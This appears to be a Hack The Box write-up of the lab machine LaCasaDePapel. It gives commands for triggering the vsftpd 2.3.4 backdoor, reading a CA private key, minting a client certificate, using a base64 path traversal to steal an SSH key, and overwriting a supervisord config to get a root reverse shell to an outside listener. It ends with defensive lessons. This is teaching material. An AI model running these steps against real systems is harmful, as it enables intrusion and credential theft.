---
layout: post
title: "The Heist Needs Its Own Key"
subtitle: "HTB LaCasaDePapel, where an old FTP backdoor drops you into a caged PHP shell, the vault hands over the master key that signs your own ID, and a root job left in a hireable office finishes the job"
date: 2019-08-03 12:00:00 +0000
description: "A 2011 FTP backdoor drops you into a caged PHP console, the box hands you the very key that signs your own entry badge, and a root job left in a writable office walks you the rest of the way in."
image: /assets/og/the-heist-needs-its-own-key.png
tags: [hackthebox, writeup]
---

LaCasaDePapel is a heist box, and it plays like one. You climb in through a 2011 backdoor that should have been welded shut years ago, except it does not drop you into a normal shell. It drops you into a cage, a PHP console with the dangerous tools snapped off, so you can read but not run. Then the box does the most heist thing imaginable. It leaves the master key in the vault, the key that signs the badges, and once you have it you stop trying to break the lock and simply print yourself a guard's ID. From inside the private gallery a sloppy download link lets you walk out with a man's SSH key, and the last door is a root job idling in an office whose nameplate has your name on it. Nothing here is forced. Every lock on this box is opened with a key the box itself handed you.

```
        L A   C A S A   D E   P A P E L
        ===============================
        ftp login: iceberg:)   ->  the 2011 trapdoor
                   |
                   v
        a php cage. read everything. run nothing.
        but the vault is unlocked, and inside it
        sits the master key that signs the badges.
                   |
                   v
        you don't pick the lock. you print a badge.
        the guard waves you in, then drops his keyring.
                                                    钱
```

## 0x01 · the four doors

`nmap -sC -sV` comes back with four ports, and the first one is a ghost.

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js Express framework
443/tcp open  ssl/http Node.js Express framework
```

`vsftpd 2.3.4` is the version with the famous smiley-face backdoor (CVE-2011-2523), and seeing it in a scan is like finding a wanted poster pinned to the front door. Ports 80 and 443 are a Node app, and the HTTPS side is the one that matters because it demands a client certificate before it says a word. Picture a members-only gallery with a doorman who does not check a password but a badge, a physical thing he has to see in your hand. Hold that thought. The whole middle of this box is about manufacturing that badge.

## 0x02 · the trapdoor that drops you in a cage

The vsftpd backdoor is almost a prank. You log in with any username ending in `:)`, a literal smiley, and the daemon quietly opens a second service on port 6200.

```
$ nc 10.10.10.131 21
USER iceberg:)
PASS anything
$ nc 10.10.10.131 6200
```

On the original 2011 worm this would be a root command shell. Here the box's author rewired the trapdoor. What answers on 6200 is a Psy Shell, an interactive PHP console (`Psy Shell v0.9.9 (PHP 7.2.10)`), and somebody took the time to file the teeth off it.

```
>>> system('id')
PHP error:  Call to undefined function system()
>>> exec('whoami')
PHP error:  Call to undefined function exec()
```

`system`, `exec`, `passthru`, all disabled. Think of it like being lowered into the bank through the skylight only to find the floor of the lobby is a glass cage. You can see every shelf, you can read every label, but the moment you reach for a tool that does real damage, your hand hits glass. So you stop reaching for tools and start reaching for paper. The filesystem functions still work, and those are all you need.

```
>>> scandir('/home')
=> [ ".", "..", "berlin", "dali", "nairobi", "professor" ]
>>> scandir('/home/nairobi')
=> [ ".", "..", "ca.key", "download.sh", "user.txt" ]
```

There it is. `ca.key` in nairobi's home. A certificate authority's private key, the master that signs every badge the doorman accepts. `file_get_contents` reads it straight out, no permission stops you.

```
>>> file_get_contents('/home/nairobi/ca.key')
=> "-----BEGIN PRIVATE KEY-----\nMIIE..."
```

## 0x03 · printing your own badge

A certificate authority is just the office that signs ID cards and vouches for them. The doorman on 443 trusts anything that office signs. Steal the office's signing pen, the CA private key, and you are no longer forging badges, you are issuing real ones. The guard cannot tell the difference because there is no difference. It is the same pen.

So you take `ca.key` and use it to mint a client certificate for yourself, then bundle it into the PKCS#12 format a browser can import.

```
$ openssl req -new -key ca.key -out iceberg.csr
$ openssl x509 -req -days 365 -in iceberg.csr -signkey ca.key -out iceberg.crt
$ openssl pkcs12 -export -in iceberg.crt -inkey ca.key -out iceberg.p12
```

Load `iceberg.p12` into the browser, hit 443 again, and the doorman who refused to speak a minute ago waves you through into the Private Area. The badge is genuine. You signed it with the bank's own pen.

## 0x04 · the download link that reads too much

Inside the members area is a media library, seasons of a show, and each file comes down through a tidy little endpoint. The site lists a folder with a `?path=` parameter and serves the actual bytes from a `/file/` route whose argument is the path base64-encoded. That double of base64 plus a path parameter is a tell, because base64 is not security, it is a costume. Underneath, the server is taking a string from you and handing it straight to the filesystem.

So you stop asking for episodes and start asking for the path to climb out of the media folder.

```
# "../.ssh/id_rsa"  ->  base64  ->  Li4vLnNzaC9pZF9yc2E=
$ curl -k --cert iceberg.p12 https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
```

The traversal walks up out of the gallery and lifts an SSH private key. Here is the box's small joke. The directory the app runs from belongs to berlin, so the key you pull from `../.ssh/id_rsa` is sitting in berlin's tree, but it is the professor's key, and it logs you in as professor.

```
$ ssh -i id_rsa professor@10.10.10.131
professor@lacasadepapel:~$ id
uid=1002(professor) ...
```

Think of it like swiping a keycard you found in one man's desk drawer only to learn it opens a different man's office. The drawer said berlin. The card said professor. The card is what matters.

## 0x05 · the office with your name on the door

professor is not root, but professor's home directory is the last domino. Sitting in it is `memcached.ini`, a supervisord config file. supervisord is a process babysitter that runs as root and keeps a list of programs it is responsible for starting, restarting, and watching. This particular config tells root to launch a Node script.

```
$ cat /home/professor/memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

The file itself is owned by root and read-only, so you cannot edit it. That looks like a wall until you check who owns the room it lives in.

```
$ ls -ld /home/professor
drwxr-xr-x 5 professor professor ... /home/professor
```

professor owns the directory. On a Linux filesystem the right to delete a file comes from the directory that holds it, not the file itself. Picture a locked metal box bolted to a desk, except you own the desk. You cannot pry the lid off the box, but you can unbolt the whole thing, throw it in the dumpster, and bolt down an identical-looking box of your own. Same desk, same spot, brand new contents. So you delete the root-owned `memcached.ini` you cannot edit and drop a fresh one in its place with a `command =` line of your choosing.

```
$ rm /home/professor/memcached.ini
$ printf '[program:iceberg]\ncommand = %s\n' \
    '[ bash reverse shell back to 10.10.14.4 on 1337 ]' \
    > /home/professor/memcached.ini
```

supervisord is running as root and it re-reads its programs and restarts dead ones on its own schedule. When it next cycles, it dutifully runs your line as root, because that is the one thing it was always going to do. The shell that lands is wearing the crown.

```
$ nc -lvnp 1337
connect to [10.10.14.4] from 10.10.10.131
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

It is easy to read LaCasaDePapel as a string of unrelated gimmicks, an old FTP bug, a cert trick, a base64 path, a weird config file. It is not. Every step is the same confession told four ways. Somebody trusted a thing they should have verified, and trust without verification is just a door that looks locked.

The cert step is the one to tattoo on your arm. Nothing was buggy there. Client certificates are a genuinely strong way to gate a site, far better than a password, and the doorman did his job perfectly. The disaster was a process decision, that the CA's private key, the one secret that must never leave a vault, was sitting world-readable in a home directory where a caged PHP console could scoop it up. A signing key is not a password you can rotate over coffee. It is the authority itself. Lose it and the attacker is not breaking your trust system, they are becoming it, issuing valid IDs you have no way to refuse.

And the root step ships green. No CVE, no exploit, no unpatched anything. supervisord did exactly what it was told, sudo dropped to nobody exactly as written, the only flaw was a root-owned config file parked in a directory its owner could not be trusted to control. You cannot `apt upgrade` your way out of that. The patch fixes a binary. Only paranoia fixes a permission. Whoever can delete the file can rewrite the file, and the filesystem has been saying so out loud since 1970.

## 0x07 · outro

```
the trapdoor still opens, but it drops you in a cage.
the cage couldn't run a command, so you read a key instead.
the key signed your own badge, and the guard couldn't say no.
the last door wasn't locked. it just had your name on it.

four doors. not one of them forced.
every key on the ring was handed to you by the house.

guard the signing pen. own the directory, own the file. wear black.

                                                            EOF
```

---

*HTB: LaCasaDePapel, retired 27 Jul 2019. An easy Linux box that is really a lecture on trust you never verified, wearing a bank-heist costume. The smiley still opens the trapdoor in a lab and nowhere you don't own.*